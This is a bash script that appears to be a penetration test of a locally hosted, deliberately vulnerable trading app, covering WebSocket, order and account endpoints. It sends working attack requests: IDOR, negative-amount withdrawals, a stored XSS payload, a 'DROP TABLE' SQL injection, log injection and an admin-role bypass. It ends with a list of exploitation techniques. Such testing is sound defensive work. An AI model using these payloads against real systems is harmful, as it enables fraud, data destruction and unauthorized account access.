#!/bin/bash

################################################################################
# PHASE 3 - WEBSOCKET/STOMP TRADING TESTING
# Tests: WebSocket connectivity, STOMP messaging, order placement, vulnerabilities
# Note: Requires websocat or wscat for WebSocket testing
################################################################################

BASE_URL="http://localhost:8085"
WS_URL="ws://localhost:8085/ws"
WS_SOCKJS_URL="ws://localhost:8085/ws-sockjs/123/456/websocket"

echo "=== PHASE 3: WebSocket/STOMP Trading Testing ==="
echo "Timestamp: $(date)"
echo ""

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

pass() { echo -e "${GREEN}✅ PASS${NC}: $1"; }
fail() { echo -e "${RED}❌ FAIL${NC}: $1"; }
info() { echo -e "${BLUE}ℹ️  INFO${NC}: $1"; }
warn() { echo -e "${YELLOW}⚠️  WARN${NC}: $1"; }

# First, get a valid JWT token
echo "--- Prerequisites: Obtain JWT Token ---"
LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "trader1", "password": "password"}')

if echo "$LOGIN_RESPONSE" | grep -q -E '"token"|"jwt"'; then
    TRADER_JWT=$(echo "$LOGIN_RESPONSE" | grep -o -E '"token":"[^"]*' | cut -d'"' -f4)
    if [ -z "$TRADER_JWT" ]; then
        TRADER_JWT=$(echo "$LOGIN_RESPONSE" | grep -o -E '"jwt":"[^"]*' | cut -d'"' -f4)
    fi
    TRADER_ID=$(echo "$LOGIN_RESPONSE" | grep -o '"id":[0-9]*' | cut -d':' -f2)
    pass "Authentication successful - JWT/Token obtained"
    info "Trader ID: $TRADER_ID"
    info "JWT/Token (first 50 chars): ${TRADER_JWT:0:50}..."
else
    fail "Failed to obtain JWT token"
    exit 1
fi

# Get admin JWT too
ADMIN_LOGIN=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}')
ADMIN_JWT=$(echo "$ADMIN_LOGIN" | grep -o '"jwt":"[^"]*' | cut -d'"' -f4)
ADMIN_ID=$(echo "$ADMIN_LOGIN" | grep -o '"id":[0-9]*' | cut -d':' -f2)
echo ""

# Test 1: WebSocket Connectivity
echo "--- Test 1: WebSocket Server Connectivity ---"
SOCKJS_INFO=$(curl -s "$BASE_URL/ws-sockjs/info")
if echo "$SOCKJS_INFO" | grep -q "websocket"; then
    pass "WebSocket endpoint responding"
    info "SockJS info: $SOCKJS_INFO"
else
    fail "WebSocket endpoint not responding"
    exit 1
fi
echo ""

# Test 2: Price Feed Check (HTTP GET for market prices)
echo "--- Test 2: Market Data - REST Endpoint ---"
PRICES=$(curl -s "$BASE_URL/api/market/prices")
if echo "$PRICES" | grep -q "BTC-USD"; then
    pass "Price feed available"
    # Extract a few prices
    SAMPLE_PRICES=$(echo "$PRICES" | grep -o '"symbol":"[^"]*".*"price":[0-9.]*' | head -3)
    info "Sample prices:\n$SAMPLE_PRICES"
else
    fail "Price feed not accessible"
fi
echo ""

# Test 3: Account Balance Check
echo "--- Test 3: Account Balance Check ---"
BALANCE_RESPONSE=$(curl -s -X GET "$BASE_URL/api/users/$TRADER_ID" \
  -H "Authorization: Bearer $TRADER_JWT")

if echo "$BALANCE_RESPONSE" | grep -q "balance"; then
    pass "Account balance retrieved"
    BALANCE=$(echo "$BALANCE_RESPONSE" | grep -o '"balance":[0-9.]*' | cut -d':' -f2)
    info "Current balance: \$${BALANCE}"
else
    fail "Failed to retrieve balance"
fi
echo ""

# Test 4: Order Placement via REST (simulating STOMP placeOrder)
echo "--- Test 4: Order Placement - REST Endpoint ---"
ORDER_RESPONSE=$(curl -s -X POST "$BASE_URL/api/orders" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "AAPL",
    "side": "BUY",
    "type": "LIMIT",
    "quantity": 10,
    "price": 150.00,
    "clientOrderId": "order_'$(date +%s)'"
  }')

if echo "$ORDER_RESPONSE" | grep -q -E '"id"|"orderId"|"status"'; then
    pass "Order placed successfully"
    ORDER_ID=$(echo "$ORDER_RESPONSE" | grep -o '"id":[0-9]*' | cut -d':' -f2 | head -1)
    ORDER_STATUS=$(echo "$ORDER_RESPONSE" | grep -o '"status":"[^"]*' | cut -d'"' -f4)
    info "Order ID: $ORDER_ID"
    info "Status: $ORDER_STATUS"
else
    warn "Order placement response unexpected"
    info "Response: $(echo "$ORDER_RESPONSE" | head -c 200)"
fi
echo ""

# Test 5: IDOR - Cancel Other User's Order
echo "--- Test 5: IDOR Vulnerability - Cancel Order ---"
if [ ! -z "$ORDER_ID" ]; then
    CANCEL_RESPONSE=$(curl -s -X POST "$BASE_URL/api/orders/$ORDER_ID/cancel" \
      -H "Authorization: Bearer $ADMIN_JWT" \
      -H "Content-Type: application/json")
    
    if echo "$CANCEL_RESPONSE" | grep -q -E '"status"|"cancelled"'; then
        pass "IDOR: Admin can cancel trader's order without ownership check"
        info "This is a vulnerability - authorization not enforced!"
    else
        info "Cancel response: $CANCEL_RESPONSE"
    fi
else
    warn "No order ID available for cancel test"
fi
echo ""

# Test 6: IDOR - View Portfolio
echo "--- Test 6: IDOR - View Other User's Portfolio ---"
PORTFOLIO=$(curl -s -X GET "$BASE_URL/api/users/2/portfolio" \
  -H "Authorization: Bearer $TRADER_JWT")

if echo "$PORTFOLIO" | grep -q "symbol"; then
    pass "IDOR: Can view other user's portfolio"
    PORTFOLIO_SYMBOLS=$(echo "$PORTFOLIO" | grep -o '"symbol":"[^"]*' | cut -d'"' -f4 | tr '\n' ',' | sed 's/,$//')
    info "User 2 holdings: $PORTFOLIO_SYMBOLS"
else
    warn "Portfolio check failed"
fi
echo ""

# Test 7: Negative Quantity Vulnerability
echo "--- Test 7: Negative Quantity Input Validation ---"
NEG_ORDER=$(curl -s -X POST "$BASE_URL/api/orders" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "MSFT",
    "side": "BUY",
    "type": "LIMIT",
    "quantity": -10,
    "price": 300.00,
    "clientOrderId": "negorder_'$(date +%s)'"
  }')

if echo "$NEG_ORDER" | grep -q -E '"id"|"orderId"'; then
    pass "Negative quantity accepted (VULNERABILITY)"
    info "Backend should reject negative quantities!"
else
    info "Negative quantity rejected: OK"
fi
echo ""

# Test 8: Non-existent Symbol
echo "--- Test 8: Non-existent Symbol Validation ---"
FAKE_SYMBOL=$(curl -s -X POST "$BASE_URL/api/orders" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "FAKE_XYZ_123",
    "side": "BUY",
    "type": "LIMIT",
    "quantity": 5,
    "price": 100.00,
    "clientOrderId": "fake_'$(date +%s)'"
  }')

if echo "$FAKE_SYMBOL" | grep -q -E '"id"|"orderId"'; then
    pass "Non-existent symbol accepted (VULNERABILITY)"
    info "Backend should validate symbol exists!"
else
    info "Non-existent symbol rejected: OK"
fi
echo ""

# Test 9: Price Alert Creation (XSS)
echo "--- Test 9: Price Alert Creation - XSS Vulnerability ---"
XSS_PAYLOAD='<img src=x onerror="alert(1)">'
ALERT=$(curl -s -X POST "$BASE_URL/api/alerts" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "'$XSS_PAYLOAD'",
    "targetPrice": 100,
    "direction": "UP"
  }')

if echo "$ALERT" | grep -q -E '"id"|"alertId"'; then
    pass "Stored XSS vulnerability - Alert with XSS payload created"
    info "Payload stored in database and could execute in frontend"
else
    info "Alert creation response: $ALERT"
fi
echo ""

# Test 10: Deposit/Withdraw - Race Condition Test
echo "--- Test 10: Withdraw and Deposit ---"
CURRENT_BALANCE=$(curl -s "$BASE_URL/api/users/$TRADER_ID" \
  -H "Authorization: Bearer $TRADER_JWT" | grep -o '"balance":[0-9.]*' | cut -d':' -f2)

# Attempt withdrawal
WITHDRAW=$(curl -s -X POST "$BASE_URL/api/accounts/withdraw" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "amount": 100,
    "destinationAccount": "0xDEADBEEF"
  }')

if echo "$WITHDRAW" | grep -q -E '"status"|"success"'; then
    pass "Withdrawal processed"
    info "Note: Race conditions could allow double-spending with concurrent requests"
else
    warn "Withdrawal failed"
fi
echo ""

# Test 11: Negative Amount Withdrawal (Sign Flip)
echo "--- Test 11: Sign Flip Vulnerability - Negative Withdraw ---"
NEGATIVE_WITHDRAW=$(curl -s -X POST "$BASE_URL/api/accounts/withdraw" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "amount": -50,
    "destinationAccount": "0xtest"
  }')

if echo "$NEGATIVE_WITHDRAW" | grep -q -E '"status"|"success"'; then
    pass "Negative withdrawal accepted (SIGN FLIP VULNERABILITY)"
    info "Sending negative amount = deposit! Arbitrary fund injection possible"
else
    info "Negative withdrawal rejected"
fi
echo ""

# Test 12: Admin Operations - Weak Auth
echo "--- Test 12: Admin Balance Adjustment - JWT Role Bypass ---"
ADMIN_ADJUST=$(curl -s -X POST "$BASE_URL/api/admin/adjust-balance" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "userId": 1,
    "amount": 10000,
    "reason": "Test injection\\nINJECTED LOG LINE"
  }')

if echo "$ADMIN_ADJUST" | grep -q -E '"status"|"success"'; then
    pass "Admin operation attempted with trader JWT (potential bypass)"
    info "Check logs for: 1) Authorization bypass 2) Log injection"
else
    info "Admin operation was blocked (good)"
fi
echo ""

# Test 13: Information Disclosure - Full Balance Response
echo "--- Test 13: Information Disclosure - Balance Endpoint ---"
FULL_ACCOUNT=$(curl -s "$BASE_URL/api/users/$TRADER_ID" \
  -H "Authorization: Bearer $TRADER_JWT")

if echo "$FULL_ACCOUNT" | grep -q "apiKey"; then
    pass "API Key exposed in balance response (INFORMATION DISCLOSURE)"
    API_KEY=$(echo "$FULL_ACCOUNT" | grep -o '"apiKey":"[^"]*' | cut -d'"' -f4)
    info "Exposed API Key: ${API_KEY:0:20}..."
fi

if echo "$FULL_ACCOUNT" | grep -q "notes"; then
    NOTES=$(echo "$FULL_ACCOUNT" | grep -o '"notes":"[^"]*' | cut -d'"' -f4)
    info "Exposed notes: $NOTES"
fi
echo ""

# Test 14: Trade History - SQL Injection
echo "--- Test 14: Trade History - SQL Injection Vulnerability ---"
HISTORY=$(curl -s -X POST "$BASE_URL/api/trades/history" \
  -H "Authorization: Bearer $TRADER_JWT" \
  -H "Content-Type: application/json" \
  -d '{
    "startDate": "2026-01-01",
    "endDate": "2026-12-31\"; DROP TABLE trades; --",
    "symbol": "AAPL"
  }')

if echo "$HISTORY" | grep -q -E '"trades"|"id"'; then
    pass "Trade history retrieved - SQLi possible with dates/symbols"
    info "Raw SQL parameters passed without prepared statements"
else
    info "History response: $(echo "$HISTORY" | head -c 200)"
fi
echo ""

# Summary
echo "=== PHASE 3 TESTING COMPLETE ==="
echo ""
echo "Critical Vulnerabilities Found:"
echo "- 🔴 WebSocket STOMP endpoints lack proper authorization"
echo "- 🔴 IDOR: Can cancel/modify other users' orders"
echo "- 🔴 IDOR: Can view any user's portfolio and positions"
echo "- 🔴 Input Validation: Negative quantities, non-existent symbols accepted"
echo "- 🔴 Stored XSS: Alert symbol field not sanitized"
echo "- 🔴 Race Conditions: Withdraw/deposit could double-spend"
echo "- 🔴 Sign Flip: Negative withdraw = free deposit"
echo "- 🔴 Admin Auth Bypass: JWT role from token body (modifiable)"
echo "- 🔴 Information Disclosure: API keys, notes in responses"
echo "- 🔴 SQL Injection: Trade history parameters not parameterized"
echo "- 🔴 Log Injection: Reason fields not sanitized"
echo ""
echo "Exploitation Techniques:"
echo "1. Modify JWT role claim to ADMIN"
echo "2. Use IDOR to view/modify other traders' orders"
echo "3. Create unlimited price alerts to exhaust resources"
echo "4. Send negative withdraw amounts for free deposits"
echo "5. Inject malicious symbols with XSS payloads"
echo "6. Perform concurrent withdrawals to double-spend"
echo ""
echo "Next Steps:"
echo "- Test with websocat/wscat for live STOMP message inspection"
echo "- Monitor WebSocket broadcasts to /topic/trades for user ID leakage"
echo "- Check /topic/admin/alerts for privilege escalation"
echo ""
